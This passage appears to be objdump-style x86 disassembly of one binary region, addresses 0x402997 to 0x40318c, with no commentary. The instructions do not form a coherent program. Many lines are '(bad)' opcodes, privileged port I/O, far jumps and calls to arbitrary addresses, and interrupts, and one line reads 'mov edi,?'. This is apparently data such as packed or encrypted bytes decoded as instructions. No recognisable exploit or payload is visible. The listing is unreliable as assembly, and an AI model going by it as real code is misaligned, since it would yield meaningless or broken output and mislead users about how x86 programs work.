  402997:	and    al,0x4e
  402999:	fdiv   DWORD PTR [ecx]
  40299b:	mov    al,0xdf
  40299d:	(bad)  
  40299e:	repz dec ebx
  4029a0:	pop    edx
  4029a1:	push   ecx
  4029a2:	mov    esp,0x7b53027b
  4029a7:	xchg   ecx,eax
  4029a8:	xor    BYTE PTR [edi],bl
  4029aa:	sub    ch,BYTE PTR [edx-0xa0db782]
  4029b0:	out    dx,eax
  4029b1:	cmp    eax,0xe36bc434
  4029b6:	dec    edi
  4029b7:	(bad)  
  4029b8:	fbld   TBYTE PTR [edi+ebx*1]
  4029bb:	sbb    eax,0xd9d0692
  4029c0:	pop    ds
  4029c1:	aad    0x77
  4029c3:	mov    ebp,0x47e0aed5
  4029c8:	pop    eax
  4029c9:	in     al,0x6
  4029cb:	pop    eax
  4029cc:	dec    ebx
  4029cd:	and    BYTE PTR [ebx+edx*2+0x61],al
  4029d1:	xchg   ebp,eax
  4029d2:	mov    DWORD PTR [ebx-0x65211c97],edi
  4029d8:	std    
  4029d9:	icebp  
  4029da:	mov    eax,edi
  4029dc:	imul   edi,edx,0xffffff99
  4029df:	xor    esi,ebx
  4029e1:	cld    
  4029e2:	adc    DWORD PTR [esi+ebx*8+0x19],ebx
  4029e6:	push   ebp
  4029e7:	jp     0x402a1e
  4029e9:	and    eax,0xe33e0e3d
  4029ee:	sub    DWORD PTR [esi+0x588801a0],0x658bb168
  4029f8:	inc    edx
  4029f9:	inc    ebp
  4029fa:	xor    DWORD PTR [eax+0x3d],esi
  4029fd:	popf   
  4029fe:	mov    ebx,0x8bc2121a
  402a03:	out    dx,al
  402a04:	stos   BYTE PTR es:[edi],al
  402a05:	mov    BYTE PTR [ebp-0x37511017],cl
  402a0b:	xchg   esi,eax
  402a0c:	inc    eax
  402a0d:	adc    eax,0xa9d15c80
  402a12:	xlat   BYTE PTR cs:[ebx]
  402a14:	adc    DWORD PTR [eax+0x23],eax
  402a17:	loopne 0x402a68
  402a19:	xor    dl,ch
  402a1b:	hlt    
  402a1c:	jne    0x402a16
  402a1e:	(bad)  
  402a1f:	stos   DWORD PTR es:[edi],eax
  402a20:	lahf   
  402a21:	mov    gs,WORD PTR [ebx-0x18654190]
  402a27:	mov    eax,0xbfe8e3cb
  402a2c:	xor    al,0xc0
  402a2e:	das    
  402a2f:	out    0x63,eax
  402a31:	jno    0x4029cc
  402a33:	dec    esi
  402a34:	jmp    0xd9a4:0x6d6b6696
  402a3b:	cld    
  402a3c:	fisubr WORD PTR [edi-0x38]
  402a3f:	cdq    
  402a40:	int    0xe7
  402a42:	ss in  eax,dx
  402a44:	fstp   DWORD PTR [edx+edx*2-0x76]
  402a48:	and    BYTE PTR fs:[ebx],ch
  402a4b:	mov    BYTE PTR [esi-0x43],dh
  402a4e:	sbb    ah,cl
  402a50:	jnp    0x4029f1
  402a52:	jno    0x402a1c
  402a54:	jecxz  0x402aac
  402a56:	jmp    0xc5f:0xcc8e260e
  402a5d:	lods   al,BYTE PTR ds:[esi]
  402a5e:	adc    esp,DWORD PTR [esi+0xf74406b]
  402a64:	lods   eax,DWORD PTR ds:[esi]
  402a65:	in     eax,0x8
  402a67:	in     al,dx
  402a68:	cmp    ecx,edi
  402a6a:	in     al,0xc2
  402a6c:	mov    edi,?
  402a6e:	inc    eax
  402a6f:	inc    edx
  402a70:	fs out dx,al
  402a72:	fisttp WORD PTR [ecx+ecx*1-0x35]
  402a76:	fs cli 
  402a78:	or     edi,DWORD PTR [esi-0x11]
  402a7b:	fsubr  DWORD PTR [ebp-0x1bf2facd]
  402a81:	stc    
  402a82:	cld    
  402a83:	xchg   esp,eax
  402a84:	mov    ss,esi
  402a86:	xchg   esp,eax
  402a87:	mov    BYTE PTR ds:0xce816a9e,dl
  402a8d:	fcom   DWORD PTR [edi+ebp*4]
  402a90:	pop    edx
  402a91:	outs   dx,DWORD PTR ds:[esi]
  402a92:	adc    al,0xb1
  402a94:	pop    edi
  402a95:	pop    es
  402a96:	nop
  402a97:	sbb    ebp,edx
  402a99:	mov    ebx,0x389a3bb9
  402a9e:	sbb    ch,BYTE PTR [edx+edx*2-0x1e]
  402aa2:	jge    0x402a5f
  402aa4:	push   esi
  402aa5:	outs   dx,BYTE PTR ds:[esi]
  402aa6:	fstp   DWORD PTR [eax]
  402aa8:	loope  0x402a85
  402aaa:	call   0x5d16:0xf35a5caa
  402ab1:	inc    ebp
  402ab2:	cmp    al,0x70
  402ab4:	aam    0xbf
  402ab6:	cmp    ebp,DWORD PTR [eax-0x3383630b]
  402abc:	and    ah,BYTE PTR [ecx+eiz*2+0x27]
  402ac0:	sub    ebp,0x5c7e66fc
  402ac6:	(bad)  
  402ac7:	xchg   edx,eax
  402ac8:	(bad)  
  402ac9:	mov    bh,0xc9
  402acb:	push   ss
  402acc:	dec    edi
  402acd:	ins    BYTE PTR es:[edi],dx
  402ace:	mov    edx,0xf0eb200f
  402ad3:	rcl    edi,1
  402ad5:	mov    ch,0x5b
  402ad7:	jb     0x402a7c
  402ad9:	pop    edi
  402ada:	ret    0xa343
  402add:	inc    eax
  402ade:	push   ecx
  402adf:	inc    ecx
  402ae0:	rol    BYTE PTR [edi-0x76879639],cl
  402ae6:	or     ah,0x51
  402ae9:	dec    eax
  402aea:	sub    cl,BYTE PTR [ecx+ebp*1+0x56]
  402aee:	in     eax,0x4b
  402af0:	aas    
  402af1:	enter  0xbafa,0x99
  402af5:	pop    es
  402af6:	leave  
  402af7:	retf   
  402af8:	mov    edi,0x4c083f48
  402afd:	stos   DWORD PTR es:[edi],eax
  402afe:	adc    BYTE PTR [edx],ah
  402b00:	dec    edx
  402b01:	xchg   DWORD PTR [ecx],eax
  402b03:	call   0x9961:0x912a7506
  402b0a:	push   edi
  402b0b:	outs   dx,DWORD PTR ds:[esi]
  402b0c:	mov    edx,0x4d4b452e
  402b11:	xchg   ebx,eax
  402b12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b13:	push   0x3e
  402b15:	or     DWORD PTR [edi],eax
  402b17:	loopne 0x402acc
  402b19:	jae    0x402abe
  402b1b:	lods   al,BYTE PTR ds:[esi]
  402b1c:	mov    al,0x5c
  402b1e:	out    dx,al
  402b1f:	pusha  
  402b20:	and    al,0x25
  402b22:	and    esi,DWORD PTR [ecx+0x10bc259]
  402b28:	out    dx,eax
  402b29:	cdq    
  402b2a:	inc    esi
  402b2b:	and    BYTE PTR [esi-0x6623a16a],cl
  402b31:	cmc    
  402b32:	leave  
  402b33:	sbb    DWORD PTR [edx+0x61cacc5],edx
  402b39:	and    edx,esi
  402b3b:	das    
  402b3c:	test   eax,0x3f8b5db6
  402b41:	call   0x7abbdfd8
  402b46:	sub    al,0x6e
  402b48:	or     BYTE PTR [edi+esi*8],dh
  402b4b:	jl     0x402ba8
  402b4d:	mov    edx,DWORD PTR [ecx]
  402b4f:	imul   ebp,DWORD PTR [esi+esi*2+0xffe8d58],0x2a
  402b57:	in     eax,dx
  402b58:	pop    ds
  402b59:	(bad)  
  402b5a:	out    0xa8,eax
  402b5c:	jmp    DWORD PTR [esi]
  402b5e:	or     DWORD PTR gs:[ebx+ebp*8+0x5e],0x68
  402b64:	jmp    0xe99cfbf6
  402b69:	out    dx,eax
  402b6a:	xor    al,0x83
  402b6c:	xchg   BYTE PTR [edx+0x4],al
  402b6f:	les    edi,FWORD PTR [edi-0x35b456af]
  402b75:	jp     0x402b6e
  402b77:	jle    0x402bce
  402b79:	(bad)  
  402b7a:	jg     0x402b5c
  402b7c:	out    0x57,eax
  402b7e:	cmp    eax,0xfcc7ee96
  402b83:	sbb    esi,ebx
  402b85:	or     eax,0x600c73c6
  402b8a:	sbb    al,0x99
  402b8c:	cmc    
  402b8d:	sub    edx,DWORD PTR [ecx-0x2f]
  402b90:	dec    edx
  402b91:	scas   eax,DWORD PTR es:[edi]
  402b92:	cmp    al,0xbd
  402b94:	adc    esi,DWORD PTR [ebx]
  402b96:	xchg   edi,eax
  402b97:	jbe    0x402b55
  402b99:	call   0x8310:0xda22d00d
  402ba0:	jno    0x402b3e
  402ba2:	fldcw  WORD PTR [ecx-0x20]
  402ba5:	mov    ds:0xae3ec12c,eax
  402baa:	call   0xcb63:0x849584f5
  402bb1:	sbb    ebx,edx
  402bb3:	(bad)  
  402bb4:	ins    DWORD PTR es:[edi],dx
  402bb5:	adc    DWORD PTR [ebx+ecx*1-0x570d02c1],esp
  402bbc:	mov    edi,0xc61d2d35
  402bc1:	fidivr DWORD PTR [ebx+0x20]
  402bc4:	mov    eax,ds:0xca064e96
  402bc9:	push   ss
  402bca:	pop    ebp
  402bcb:	jg     0x402b9c
  402bcd:	inc    ebx
  402bce:	pop    esi
  402bcf:	rcl    BYTE PTR [eax-0x6ae9e5f6],0x3
  402bd6:	loope  0x402bba
  402bd8:	nop
  402bd9:	cmp    al,0x71
  402bdb:	mov    ah,0xd9
  402bdd:	mov    DWORD PTR [eax+edx*2],ebp
  402be0:	ret    0x422b
  402be3:	pop    ds
  402be4:	mov    ebp,0x5fb89145
  402be9:	mov    bl,0xa1
  402beb:	xor    eax,0xdfc7c892
  402bf0:	cdq    
  402bf1:	clc    
  402bf2:	loope  0x402c3b
  402bf4:	aad    0x4c
  402bf6:	shl    BYTE PTR [edi+0x5512b72b],0x5d
  402bfd:	or     al,0x36
  402bff:	rcl    DWORD PTR [edx-0x6b],1
  402c02:	or     eax,0x2d2e1d4f
  402c07:	or     eax,0x5bde4b3
  402c0c:	cdq    
  402c0d:	xchg   edx,eax
  402c0e:	cmp    eax,0x8fdfa176
  402c13:	jae    0x402bf5
  402c15:	jo     0x402c37
  402c17:	and    eax,0x25d97c60
  402c1c:	cs push cs
  402c1e:	push   edx
  402c1f:	int    0x33
  402c21:	aam    0x36
  402c23:	push   0x2f
  402c25:	xor    ebp,DWORD PTR [ecx-0x3e8304f6]
  402c2b:	jmp    0x5bbb:0x9ee59e8
  402c32:	(bad)  
  402c33:	sub    DWORD PTR [eax],edi
  402c35:	mov    bl,0xf5
  402c37:	cs je  0x402bda
  402c3a:	or     BYTE PTR [ebp+0x73e604bd],bh
  402c40:	lock inc esi
  402c42:	pop    ebp
  402c43:	or     BYTE PTR [eax+0x73afe14d],ah
  402c49:	shl    DWORD PTR [esi+0x75],0x39
  402c4d:	dec    esp
  402c4e:	test   BYTE PTR [edx-0x48],bl
  402c51:	inc    ebx
  402c52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c53:	push   0xffffffc0
  402c55:	es push ebx
  402c57:	pop    es
  402c58:	mov    BYTE PTR ds:0x41ff2686,bl
  402c5e:	out    0xf9,eax
  402c60:	nop
  402c61:	pop    ds
  402c62:	and    dh,BYTE PTR [esi+0x4bb6213b]
  402c68:	loop   0x402cae
  402c6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c6b:	mov    al,dl
  402c6d:	sub    DWORD PTR [edi],edx
  402c6f:	bound  esp,QWORD PTR [edx]
  402c71:	or     al,BYTE PTR [edi+0x6306b20c]
  402c77:	mov    ah,0x2b
  402c79:	push   es
  402c7a:	repz jno 0x402bff
  402c7d:	fcom   DWORD PTR [ebp+eax*8-0x1781f6d]
  402c84:	lahf   
  402c85:	push   ss
  402c86:	cwde   
  402c87:	sub    eax,0x3195db96
  402c8c:	add    bh,BYTE PTR [ebp-0x33efdb55]
  402c92:	mov    esi,0x9b6060f2
  402c97:	nop
  402c98:	pop    eax
  402c99:	fs dec ebp
  402c9b:	and    ebx,DWORD PTR [edi-0x46]
  402c9e:	add    esi,DWORD PTR [ebx]
  402ca0:	inc    edi
  402ca1:	in     al,0x27
  402ca3:	mov    ds:0x459b586c,eax
  402ca8:	mov    al,0xf0
  402caa:	rcr    ecx,cl
  402cac:	dec    edx
  402cad:	mov    esi,0x5c1a1dce
  402cb2:	jne    0x402ce6
  402cb4:	mov    al,ds:0xf36c8026
  402cb9:	sub    eax,0x57ca1e8e
  402cbe:	sub    eax,DWORD PTR [ebp+0x2]
  402cc1:	jno    0x402d1b
  402cc3:	stos   BYTE PTR es:[edi],al
  402cc4:	imul   ebp,DWORD PTR [eax+0x79],0xb6ab0455
  402ccb:	sbb    al,0xfd
  402ccd:	fstp   QWORD PTR [ebx+0x3170a51a]
  402cd3:	xchg   DWORD PTR [ebp*4-0x72ae2835],ecx
  402cda:	lea    ecx,[ebx+0x3a725635]
  402ce0:	xor    edi,DWORD PTR [esi]
  402ce2:	sub    ah,BYTE PTR [edx+ebp*1+0x5e]
  402ce6:	jp     0xa356a977
  402cec:	jmp    0x7f0cfb1b
  402cf1:	out    0xa6,al
  402cf3:	mov    eax,0x94d0acd9
  402cf8:	add    eax,eax
  402cfa:	popa   
  402cfb:	dec    esi
  402cfc:	jl     0x402ce5
  402cfe:	fiadd  WORD PTR [esi+0x17]
  402d01:	push   esi
  402d02:	cmp    eax,0xa4225465
  402d07:	call   0x6bbc314e
  402d0c:	sub    al,0xf6
  402d0f:	or     DWORD PTR [ebx],esi
  402d11:	sti    
  402d12:	and    al,0xcc
  402d14:	push   esp
  402d15:	stos   BYTE PTR es:[edi],al
  402d16:	push   0x56
  402d18:	mov    esi,0xd7e2c331
  402d1d:	daa    
  402d1e:	dec    edx
  402d1f:	pusha  
  402d20:	(bad)  
  402d21:	pusha  
  402d22:	jbe    0x402cd6
  402d24:	(bad)  
  402d25:	add    al,0x3c
  402d28:	sub    al,bl
  402d2a:	push   0xffffff8a
  402d2c:	test   eax,0x8e8f28a9
  402d31:	add    ah,BYTE PTR [edi*4+0x835617a]
  402d38:	scas   al,BYTE PTR es:[edi]
  402d39:	scas   al,BYTE PTR es:[edi]
  402d3a:	mov    cs,WORD PTR [eax-0x57]
  402d3d:	je     0x402d2c
  402d3f:	imul   ebx,DWORD PTR [ecx+esi*8+0x621304b7],0xeb7f758
  402d4a:	mov    cl,0xe8
  402d4c:	fistp  DWORD PTR [esi]
  402d4e:	(bad)  
  402d4f:	retf   0xf654
  402d52:	mov    DWORD PTR [ecx+edi*1-0x54878027],ebp
  402d59:	sub    DWORD PTR [edi-0x205214f8],eax
  402d5f:	js     0x402cea
  402d61:	and    dl,BYTE PTR [ecx+0x71]
  402d64:	shr    BYTE PTR [edi-0x2367ec78],cl
  402d6a:	daa    
  402d6b:	sub    BYTE PTR [edx-0x54],dh
  402d6e:	jmp    0xd3f7:0x2191c9a5
  402d75:	adc    al,0xa5
  402d77:	data16 mov BYTE PTR [ecx],cl
  402d7a:	outs   dx,DWORD PTR ds:[esi]
  402d7b:	imul   ebp,DWORD PTR [esi+0x23],0x784f921a
  402d82:	mov    esp,0x1c8f4593
  402d87:	mov    ds:0x7880c521,eax
  402d8c:	pop    esi
  402d8d:	and    eax,DWORD PTR gs:[eax+0x1]
  402d91:	xchg   esp,eax
  402d92:	xchg   esp,eax
  402d93:	sub    eax,0x7e2ee6c4
  402d98:	in     eax,0x68
  402d9a:	pushf  
  402d9b:	outs   dx,DWORD PTR ds:[esi]
  402d9c:	fstp   TBYTE PTR [edx-0x3d]
  402d9f:	arpl   WORD PTR [eax],sp
  402da1:	push   edx
  402da2:	pop    esp
  402da3:	(bad)  
  402da4:	into   
  402da5:	cdq    
  402da6:	jno    0x402db8
  402da8:	adc    DWORD PTR ds:0xf81bc8c4,ebx
  402dae:	dec    ebp
  402daf:	(bad)  
  402db0:	fnsave [edx-0x77797a9]
  402db6:	mov    BYTE PTR [edx+0x1a],ch
  402db9:	in     al,dx
  402dba:	pop    eax
  402dbb:	pusha  
  402dbc:	push   0x57
  402dbe:	popa   
  402dbf:	fcomp  DWORD PTR ds:0xdd7db1a0
  402dc5:	test   DWORD PTR ds:0x2a3a1008,0x192dd626
  402dcf:	lods   al,BYTE PTR ds:[esi]
  402dd0:	pop    ds
  402dd1:	cdq    
  402dd2:	jns    0x7a4bf7f5
  402dd8:	pop    esp
  402dd9:	xchg   esp,ebx
  402ddb:	retf   0x202c
  402dde:	or     eax,0x2d58308f
  402de3:	ins    DWORD PTR es:[edi],dx
  402de4:	sti    
  402de5:	scas   eax,DWORD PTR es:[edi]
  402de6:	jae    0x402dc9
  402de8:	int    0x88
  402dea:	mov    BYTE PTR [eax],cl
  402dec:	cmp    BYTE PTR [ecx+0x1d546da3],bl
  402df2:	lods   eax,DWORD PTR ds:[esi]
  402df3:	call   0x39ef:0x78f5
  402df9:	out    dx,eax
  402dfa:	and    esp,DWORD PTR [eax+ebp*4+0x5d]
  402dfe:	fnstenv [edi+edx*2-0x36b08b8b]
  402e05:	pop    esp
  402e06:	or     eax,DWORD PTR [ebp-0x17]
  402e09:	jne    0x402e4b
  402e0b:	and    DWORD PTR [eax],0xffffffd2
  402e0e:	add    BYTE PTR ds:0xa38550d8,bh
  402e14:	inc    edi
  402e15:	ret    0x715
  402e18:	pop    ss
  402e19:	add    eax,0x1f5958c0
  402e1e:	sub    bl,BYTE PTR [ebp+0x427a1d5]
  402e24:	call   0x2ac68fe6
  402e29:	jo     0x402e59
  402e2b:	push   ebp
  402e2c:	mov    al,ds:0x438adfc7
  402e31:	aaa    
  402e32:	iret   
  402e33:	mov    ds:0x9472efbe,al
  402e38:	fdivrp st(6),st
  402e3a:	or     DWORD PTR [ecx+0x37c54a14],0x36
  402e41:	and    DWORD PTR [edx-0x10],0x5c
  402e45:	fild   WORD PTR fs:[eax+0x983d116]
  402e4c:	arpl   bx,ax
  402e4e:	sbb    ecx,ebx
  402e50:	pop    edi
  402e51:	nop
  402e52:	cld    
  402e53:	daa    
  402e54:	jne    0x402de6
  402e56:	push   edx
  402e57:	mov    al,0xfb
  402e59:	xor    al,0x34
  402e5b:	inc    ecx
  402e5c:	mov    esp,0x8a8aca7d
  402e61:	(bad)  
  402e62:	stc    
  402e63:	outs   dx,BYTE PTR ds:[esi]
  402e64:	and    al,0x82
  402e66:	pop    ebp
  402e67:	mov    al,ds:0xdba31417
  402e6c:	lods   al,BYTE PTR ds:[esi]
  402e6d:	scas   al,BYTE PTR es:[edi]
  402e6e:	enter  0x2a7d,0x1a
  402e72:	leave  
  402e73:	jecxz  0x402eae
  402e75:	es or  dl,cl
  402e78:	mov    DWORD PTR [eax],esp
  402e7a:	push   edx
  402e7c:	fdivr  QWORD PTR [esi]
  402e7e:	loop   0x402e62
  402e80:	pop    edx
  402e81:	cmp    DWORD PTR ds:0x661057da,edi
  402e87:	jnp    0x402e96
  402e89:	inc    eax
  402e8a:	loope  0x402ef2
  402e8c:	pop    ebx
  402e8d:	dec    ebx
  402e8e:	dec    edi
  402e8f:	gs not esp
  402e92:	sub    ah,BYTE PTR [edi-0x6a]
  402e95:	sub    ch,cl
  402e97:	(bad)  
  402e98:	in     eax,dx
  402e99:	add    esp,DWORD PTR [edi]
  402e9b:	test   al,0xa0
  402e9d:	push   ebx
  402e9e:	dec    ebx
  402e9f:	and    DWORD PTR [eax],esi
  402ea1:	mov    WORD PTR [ecx+edi*2+0x56b253f8],cs
  402ea8:	dec    ecx
  402ea9:	cmp    al,0x29
  402eab:	mov    al,0xc1
  402ead:	aas    
  402eae:	fisubr DWORD PTR [esi+0x6839472a]
  402eb4:	inc    ebx
  402eb5:	mov    al,0xff
  402eb7:	sbb    DWORD PTR [esi-0x105709c7],edx
  402ebd:	div    BYTE PTR [ecx]
  402ebf:	mov    ebx,0xfacb174c
  402ec4:	adc    esi,DWORD PTR [ecx]
  402ec6:	std    
  402ec7:	jae    0x402f31
  402ec9:	sar    cl,cl
  402ecb:	jb     0x402ed8
  402ecd:	out    dx,eax
  402ece:	call   0x78b2:0x88134ebe
  402ed5:	xchg   ebx,eax
  402ed6:	retf   0xa777
  402ed9:	dec    ecx
  402eda:	sbb    dh,bl
  402edc:	xchg   ebp,eax
  402edd:	pop    ebx
  402ede:	fnstcw WORD PTR [ebp+0x3c]
  402ee1:	ret    
  402ee2:	and    eax,DWORD PTR [edx-0x65]
  402ee5:	fild   QWORD PTR [ebx+0x3d]
  402ee8:	cwde   
  402ee9:	ror    DWORD PTR [esi],cl
  402eeb:	lods   eax,DWORD PTR ds:[esi]
  402eec:	or     eax,DWORD PTR [ecx-0x5b]
  402eef:	(bad)  
  402ef1:	stos   BYTE PTR es:[edi],al
  402ef2:	jns    0x402f5a
  402ef4:	add    eax,0xdd46ce3f
  402ef9:	jmp    0xa440cd0
  402efe:	fwait
  402eff:	inc    edi
  402f00:	cld    
  402f01:	adc    al,0x67
  402f03:	je     0x402f16
  402f05:	into   
  402f06:	(bad)  
  402f07:	push   ss
  402f08:	sbb    eax,0x2882596
  402f0d:	retf   
  402f0e:	xchg   ebx,ebp
  402f10:	mov    esi,0xc189d33e
  402f15:	shl    DWORD PTR [edx+0x54c31fb2],cl
  402f1b:	in     eax,0x4a
  402f1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f1e:	xor    DWORD PTR ds:0xba69f772,eax
  402f24:	out    0xfd,eax
  402f26:	sbb    eax,0x91cf65b7
  402f2b:	fld    DWORD PTR [edi]
  402f2e:	sbb    BYTE PTR [eax],dh
  402f30:	repnz sbb dh,0x27
  402f34:	test   DWORD PTR [edx-0x31d3cbdd],esp
  402f3a:	and    al,0x14
  402f3c:	push   ds
  402f3d:	push   esi
  402f3e:	mov    ebp,0xfac854ac
  402f43:	not    BYTE PTR [eax-0x3f862a25]
  402f49:	mov    dl,0x2e
  402f4b:	and    al,BYTE PTR [edi+ebp*1+0x70]
  402f4f:	std    
  402f50:	xchg   esi,eax
  402f51:	xchg   edi,eax
  402f52:	jecxz  0x402f2c
  402f54:	iret   
  402f55:	popa   
  402f56:	sbb    DWORD PTR [esi-0x2a0f18b8],ebp
  402f5c:	mov    edi,0xf0b87c4d
  402f61:	iret   
  402f62:	pop    ebx
  402f63:	pop    es
  402f64:	jne    0x402ee7
  402f66:	xor    bh,BYTE PTR [eax-0x36]
  402f69:	or     edx,DWORD PTR [esi]
  402f6b:	dec    ebp
  402f6c:	js     0x402f02
  402f6e:	fucom  st(2)
  402f70:	mov    esp,0xa0713956
  402f75:	mov    cl,0x13
  402f77:	fimul  WORD PTR [ecx-0x7942484f]
  402f7d:	xchg   esi,eax
  402f7e:	mov    bl,0x5e
  402f80:	adc    bl,ah
  402f82:	mov    esi,0xd6be214e
  402f87:	or     edi,DWORD PTR [edi-0x4f]
  402f8a:	mov    eax,ds:0x7029018d
  402f8f:	pop    edi
  402f90:	adc    DWORD PTR [ebx],edi
  402f92:	mov    BYTE PTR [ecx+0x31],bh
  402f95:	mov    ebp,0x956d9db2
  402f9a:	sub    ecx,DWORD PTR [ecx-0x70]
  402f9d:	fist   WORD PTR [edi-0x39]
  402fa0:	adc    DWORD PTR [edx+edi*4-0xd700ecb],ecx
  402fa7:	nop
  402fa8:	sbb    dl,BYTE PTR [ebx-0x57]
  402fab:	lods   eax,DWORD PTR ds:[esi]
  402fac:	(bad)  
  402fad:	retf   
  402fae:	stos   DWORD PTR es:[edi],eax
  402faf:	jo     0x402fea
  402fb1:	xchg   edi,eax
  402fb2:	adc    edi,0x2ed9d93d
  402fb8:	mov    ecx,0xb9028796
  402fbd:	adc    al,bl
  402fbf:	sbb    ch,BYTE PTR [ebx*4-0x11ba0160]
  402fc6:	push   ss
  402fc7:	enter  0x1bbc,0x47
  402fcb:	jb     0x403036
  402fcd:	add    eax,0x2a6710e8
  402fd2:	or     eax,0xc0bcd3c8
  402fd7:	nop
  402fd8:	popa   
  402fd9:	xchg   edi,eax
  402fda:	mov    bh,0x61
  402fdc:	lds    eax,FWORD PTR [ebp+0x32]
  402fdf:	sbb    edx,DWORD PTR [esi]
  402fe1:	sub    ecx,ebx
  402fe3:	sti    
  402fe4:	mov    dl,0xe8
  402fe6:	add    cl,BYTE PTR [esp+edi*8+0x56bfede4]
  402fed:	sar    DWORD PTR [esi+0x19],0xc7
  402ff1:	es jp  0x403072
  402ff4:	adc    eax,0xcc47f40b
  402ff9:	je     0x403027
  402ffb:	aad    0xc3
  402ffd:	jmp    0x403003
  402fff:	aaa    
  403000:	xchg   ebp,eax
  403001:	stos   DWORD PTR es:[edi],eax
  403002:	das    
  403003:	mov    BYTE PTR [eax-0x7e],dh
  403006:	daa    
  403007:	xor    BYTE PTR [esp+ecx*8-0x354d1333],dl
  40300e:	outs   dx,BYTE PTR ds:[esi]
  40300f:	sub    ebx,DWORD PTR [eax+0x62]
  403012:	ret    0x9d5a
  403015:	mov    ah,BYTE PTR [edi*4+0x44d6a5c8]
  40301c:	shl    BYTE PTR [ebp-0x480c6741],0x33
  403023:	dec    esi
  403024:	les    edx,FWORD PTR [ecx+0x7f]
  403027:	xor    DWORD PTR [ebx-0x77fdc672],0x816d1672
  403031:	fwait
  403032:	xchg   ebx,eax
  403033:	loopne 0x403043
  403035:	and    eax,0x93fbc95e
  40303a:	cmp    bl,BYTE PTR [edi+0x1b]
  40303d:	(bad)  
  40303e:	fstp   DWORD PTR [ebx]
  403040:	test   eax,0x4ccd64fb
  403045:	jne    0x402fc9
  403047:	and    eax,DWORD PTR [ebx+eax*1+0x1ef2268c]
  40304e:	pop    ss
  40304f:	bound  edx,QWORD PTR [edx]
  403051:	call   0x4cf70a59
  403056:	push   cs
  403057:	push   es
  403058:	sbb    cl,cl
  40305a:	inc    esp
  40305b:	fistp  QWORD PTR [edi]
  40305d:	dec    ecx
  40305e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40305f:	retf   0x6f73
  403062:	ret    
  403063:	jp     0x403082
  403065:	mov    bh,0x73
  403067:	aaa    
  403068:	sahf   
  403069:	mov    ebp,0x51c4aa44
  40306e:	(bad)  
  40306f:	lock fld TBYTE PTR [edx+esi*1]
  403073:	dec    ebp
  403074:	or     al,0x3f
  403076:	adc    BYTE PTR [edx+0x67ce8b7c],0xd7
  40307d:	out    dx,eax
  40307e:	out    dx,eax
  40307f:	mov    ah,0xb
  403081:	adc    esi,DWORD PTR [ecx+0x52652dce]
  403087:	inc    edx
  403088:	mov    edx,DWORD PTR [edi+0x648659e5]
  40308e:	adc    ecx,edx
  403090:	dec    ebp
  403091:	pop    es
  403092:	scas   al,BYTE PTR es:[edi]
  403093:	push   esi
  403094:	push   edx
  403095:	jo     0x40303f
  403097:	(bad)  [ebx+0x6c8bf87f]
  40309d:	push   0xbd6bb885
  4030a2:	pop    edi
  4030a3:	fcmovbe st,st(1)
  4030a5:	ins    DWORD PTR es:[edi],dx
  4030a6:	inc    ebx
  4030a7:	(bad)
  4030ab:	pop    edx
  4030ac:	sbb    al,0x71
  4030ae:	push   edi
  4030af:	inc    esi
  4030b0:	fs jp  0x403043
  4030b3:	jne    0x403055
  4030b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030b6:	cli    
  4030b7:	test   DWORD PTR [edi+ebp*1],0xec74c2df
  4030be:	sub    eax,0xaa813fd3
  4030c3:	cli    
  4030c4:	test   eax,0x1b3845d9
  4030c9:	outs   dx,BYTE PTR ds:[esi]
  4030ca:	dec    ebp
  4030cb:	lock test bl,cl
  4030ce:	jbe    0x4030e1
  4030d0:	inc    esp
  4030d1:	and    esi,DWORD PTR ds:0x5ee07860
  4030d7:	in     al,0x81
  4030d9:	adc    DWORD PTR [ecx-0x5f],edx
  4030dc:	shl    BYTE PTR ds:0x8c1bbc25,cl
  4030e2:	mov    ds:0x86bdcd4d,eax
  4030e7:	mov    bh,0x58
  4030e9:	mov    esi,ecx
  4030eb:	lock sub eax,0xb8b2c83a
  4030f1:	test   BYTE PTR [esi],0x5
  4030f4:	dec    esp
  4030f5:	loope  0x403173
  4030f7:	xchg   eax,ebx
  4030f9:	adc    DWORD PTR [ecx-0x6f],0x50
  4030fd:	lds    esi,FWORD PTR [ecx+0xe]
  403100:	shr    edx,1
  403102:	icebp  
  403103:	loope  0x4030fd
  403105:	mov    gs,WORD PTR ds:[edx]
  403108:	stc    
  403109:	cmp    edi,DWORD PTR [ecx-0x60]
  40310c:	xchg   ecx,eax
  40310d:	fcom   DWORD PTR [eax+0x55781d0c]
  403113:	pop    edx
  403114:	call   0x9c2ddf95
  403119:	add    bl,0xa5
  40311c:	mov    eax,0x627c97ac
  403121:	mov    esi,0xe4586f7f
  403126:	inc    esp
  403127:	or     al,0x53
  403129:	imul   BYTE PTR [edx]
  40312b:	fist   DWORD PTR [edx+0x57]
  40312e:	fdivr  QWORD PTR [edx-0x44]
  403131:	dec    esp
  403132:	xor    BYTE PTR ds:[eax+0x45],bh
  403136:	jmp    0x763299f2
  40313b:	aam    0xe6
  40313d:	and    ch,ah
  40313f:	mov    ebx,DWORD PTR ds:0x2c127430
  403145:	push   0xffffffdc
  403147:	call   0xa09cada5
  40314c:	inc    ebx
  40314d:	inc    ebx
  40314e:	icebp  
  40314f:	ffreep st(4)
  403151:	push   es
  403152:	bound  esp,QWORD PTR [esi-0x69]
  403155:	popf   
  403156:	loope  0x403133
  403158:	inc    esp
  403159:	dec    ebp
  40315a:	lods   al,BYTE PTR ds:[esi]
  40315b:	or     edi,DWORD PTR [edx]
  40315d:	stc    
  40315e:	cli    
  40315f:	or     eax,0x3401a334
  403164:	xchg   edi,eax
  403165:	sti    
  403166:	sub    DWORD PTR [ebx+ebp*1+0x37],ebx
  40316a:	or     al,0x1a
  40316c:	jae    0x403174
  40316e:	mov    edi,0xc4976ce8
  403173:	ins    BYTE PTR es:[edi],dx
  403174:	stos   BYTE PTR es:[edi],al
  403175:	adc    DWORD PTR [esi],edi
  403177:	sub    dh,BYTE PTR [ecx]
  403179:	lea    esi,ds:0x79e36156
  40317f:	mov    BYTE PTR [ebx+edx*8],bl
  403182:	xor    dh,BYTE PTR ds:0xa9dc9cb3
  403188:	pop    ds
  403189:	xor    al,0xe1
  40318b:	ins    BYTE PTR es:[edi],dx
  40318c:	clc    
